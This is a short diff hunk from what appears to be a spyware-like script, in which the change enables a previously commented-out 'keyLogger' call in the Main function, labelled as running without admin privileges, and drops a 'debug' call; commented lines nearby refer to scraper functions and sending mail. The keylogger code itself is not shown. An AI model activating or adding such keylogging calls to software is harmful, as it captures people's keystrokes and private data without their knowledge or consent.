@@ -28,8 +28,7 @@ function Main(){
 #nonAdministrativeScrapperFunctions
 #mail "test"
 ### Runs Keylogger (does not require admin privs)
-#keyLogger
-debug
+keyLogger
 }
 
 function debug(){
